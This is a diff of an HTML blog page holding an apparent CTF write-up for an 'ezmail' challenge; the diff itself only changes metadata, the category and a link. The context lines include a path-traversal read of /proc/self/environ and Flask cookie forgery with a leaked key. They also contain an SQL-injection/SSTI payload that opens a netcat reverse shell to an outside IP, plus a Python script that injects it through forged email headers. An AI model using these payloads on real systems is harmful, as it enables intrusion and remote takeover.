@@ -71,7 +71,7 @@
 <meta property="og:image" content="https://changeyourway.github.io/images/image-20250429142739-phzgo9k.png">
 <meta property="og:image" content="https://changeyourway.github.io/images/image-20250429143810-jof6lu6.png">
 <meta property="article:published_time" content="2025-04-30T09:27:55.659Z">
-<meta property="article:modified_time" content="2025-04-30T09:43:31.555Z">
+<meta property="article:modified_time" content="2025-04-30T09:47:06.592Z">
 <meta property="article:author" content="妙尽璇机">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://changeyourway.github.io/images/image-20250427215500-a64z3wa.png">
@@ -132,8 +132,8 @@
   <div class="content">
     
 <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-04-30T09:27:55.659Z">2025-04-30</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-04-30T09:43:31.555Z">2025-04-30</time></span></div></div>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/CTF/">CTF</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-04-30T09:27:55.659Z">2025-04-30</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-04-30T09:47:06.592Z">2025-04-30</time></span></div></div>
 </div>
 
     
@@ -180,7 +180,7 @@
 <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/d097b298d1494e2ba9421419b6b65c80-20250427221644-g1nr27p.png">
 
 <p>这里也是命令执行成功。这里似乎没有回显，考虑反弹 shell 。</p>
-<p>这里我看了 nk 的 poc（<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/omVLuWVSe9cQwdsAWONuUA%EF%BC%89%EF%BC%8C%E6%98%AF%E9%80%9A%E8%BF%87%E8%AF%BB%E5%8F%96%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8B%BF%E5%88%B0%E4%BA%86">https://mp.weixin.qq.com/s/omVLuWVSe9cQwdsAWONuUA），是通过读取环境变量拿到了</a> Cookie 的加密密钥，伪造了管理员的 Cookie：</p>
+<p>这里我看了 nk 的 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/omVLuWVSe9cQwdsAWONuUA">wp</a>，是通过读取环境变量拿到了 Cookie 的加密密钥，伪造了管理员的 Cookie：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file_path=../../../../../../../../proc/self/environ	# 读取环境变量</span><br><span class="line">key=S3cRetK3y	# 加密密钥</span><br><span class="line">flask-unsign --sign --secret S3cRetK3y --cookie &#x27;&#123;&quot;username&quot;: &quot;admin&quot;&#125;&#x27;	 # 伪造管理员Cookie</span><br></pre></td></tr></table></figure>
 
 <p>不得不说还是很强的。</p>
@@ -237,14 +237,14 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ezmail.org:3000/news?id=-1+union+select+&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;netcat%2061.139.2.128%208888%20-e%20/bin/bash&#x27;).read()&#125;&#125;&quot;</span><br></pre></td></tr></table></figure>
 
 <p>这个链接，看了别人的 wp 发现是漏看了一个点。</p>
-<p>&#x2F;admin 这里获取 Subject 头的时候调用了 get_subjects 方法，这里面只接收来自 <a href="mailto:&#x61;&#100;&#109;&#x69;&#x6e;&#64;&#101;&#x7a;&#109;&#x61;&#105;&#108;&#x2e;&#111;&#114;&#x67;">&#x61;&#100;&#109;&#x69;&#x6e;&#64;&#101;&#x7a;&#109;&#x61;&#105;&#108;&#x2e;&#111;&#114;&#x67;</a> 的邮件（检索邮件中是否包含 FROM “<a href="mailto:&#97;&#x64;&#109;&#105;&#x6e;&#x40;&#101;&#x7a;&#x6d;&#x61;&#105;&#108;&#46;&#x6f;&#114;&#103;">&#97;&#x64;&#109;&#105;&#x6e;&#x40;&#101;&#x7a;&#x6d;&#x61;&#105;&#108;&#46;&#x6f;&#114;&#103;</a>“ 字符串 ）：</p>
+<p>&#x2F;admin 这里获取 Subject 头的时候调用了 get_subjects 方法，这里面只接收来自 <a href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x65;&#x7a;&#109;&#x61;&#x69;&#108;&#x2e;&#111;&#x72;&#103;">&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x65;&#x7a;&#109;&#x61;&#x69;&#108;&#x2e;&#111;&#x72;&#103;</a> 的邮件（检索邮件中是否包含 FROM “<a href="mailto:&#97;&#100;&#109;&#105;&#x6e;&#x40;&#x65;&#x7a;&#x6d;&#97;&#x69;&#108;&#x2e;&#111;&#114;&#x67;">&#97;&#100;&#109;&#105;&#x6e;&#x40;&#x65;&#x7a;&#x6d;&#97;&#x69;&#108;&#x2e;&#111;&#114;&#x67;</a>“ 字符串 ）：</p>
 <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250430152704-v6sdd0x.png">
 
-<p>而 &#x2F;report 中是以 <a href="mailto:&#x69;&#103;&#110;&#x6f;&#x72;&#x65;&#100;&#x40;&#x65;&#122;&#109;&#97;&#x69;&#108;&#x2e;&#x6f;&#x72;&#103;">&#x69;&#103;&#110;&#x6f;&#x72;&#x65;&#100;&#x40;&#x65;&#122;&#109;&#97;&#x69;&#108;&#x2e;&#x6f;&#x72;&#103;</a> 去发邮件的。</p>
+<p>而 &#x2F;report 中是以 <a href="mailto:&#105;&#103;&#110;&#111;&#x72;&#101;&#x64;&#x40;&#x65;&#122;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#111;&#x72;&#x67;">&#105;&#103;&#110;&#111;&#x72;&#101;&#x64;&#x40;&#x65;&#122;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#111;&#x72;&#x67;</a> 去发邮件的。</p>
 <p>我尝试直接自己写个代码去发邮件，用代码中的用户名密码去登录，发现会遇到一些问题，比如这个邮件服务器，虽然已经能猜到就是本机，但端口号其实是不知道的，就算知道端口号（盲猜 25），也还是会发送失败（后来发现是邮件服务器的原因），下面是我的代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import smtplib</span><br><span class="line"></span><br><span class="line">smtplib._quote_periods = lambda x: x</span><br><span class="line">mail_content = &quot;&quot;&quot;From: admin@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: &#123;url&#125;\r\n\r\n&#123;content&#125;\r\n.\r\n&quot;&quot;&quot;</span><br><span class="line">url = &quot;http://ezmail.org/news?id=-1+union+select+\\\&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;netcat%2061.139.2.128%208888%20-e%20/bin/bash&#x27;).read()&#125;&#125;\\\&quot;&quot;</span><br><span class="line">try:</span><br><span class="line">    # 改用加密连接方式</span><br><span class="line">    server = smtplib.SMTP_SSL(&quot;61.139.2.128&quot;, 25)</span><br><span class="line">    # server = smtplib.SMTP(&quot;61.139.2.128&quot;, 25)</span><br><span class="line">    server.login(&#x27;admin&#x27;, &#x27;p@ssword&#x27;)  # 添加身份验证</span><br><span class="line">    server.set_debuglevel(1)  # 添加SMTP协议调试信息</span><br><span class="line">    mail_content = smtplib._fix_eols(mail_content)</span><br><span class="line">    mail_content = mail_content.format(url=url, content=&quot;content&quot;)</span><br><span class="line">    server.sendmail(&quot;admin@ezmail.org&quot;, &quot;admin@ezmail.org&quot;, mail_content)</span><br><span class="line">    print(&quot;Submitted! Now wait till the end of the world.&quot;)</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Send FAILED&quot;)</span><br></pre></td></tr></table></figure>
 
-<p>那我们就假定这个 ezmail.org 只有它本地能访问，尝试别的办法。既然只检查邮件中是否包含 FROM “<a href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#64;&#x65;&#x7a;&#x6d;&#97;&#x69;&#x6c;&#46;&#111;&#114;&#103;">&#97;&#100;&#x6d;&#105;&#x6e;&#64;&#x65;&#x7a;&#x6d;&#97;&#x69;&#x6c;&#46;&#111;&#114;&#103;</a>“ 字符串，我们可以自己伪造一个 FROM 头，这样即便有双重 FROM 头，它也都会去读取。</p>
+<p>那我们就假定这个 ezmail.org 只有它本地能访问，尝试别的办法。既然只检查邮件中是否包含 FROM “<a href="mailto:&#x61;&#100;&#x6d;&#x69;&#x6e;&#64;&#x65;&#122;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#111;&#114;&#103;">&#x61;&#100;&#x6d;&#x69;&#x6e;&#64;&#x65;&#122;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#111;&#114;&#103;</a>“ 字符串，我们可以自己伪造一个 FROM 头，这样即便有双重 FROM 头，它也都会去读取。</p>
 <p>paylaod 大致长这样：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ezmail.org/news?id=-1+union+select+&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;netcat%2061.139.2.128%208888%20-e%20/bin/bash&#x27;).read()&#125;&#125;&quot;\r\nFrom:%20admin@ezmail.org</span><br></pre></td></tr></table></figure>
 
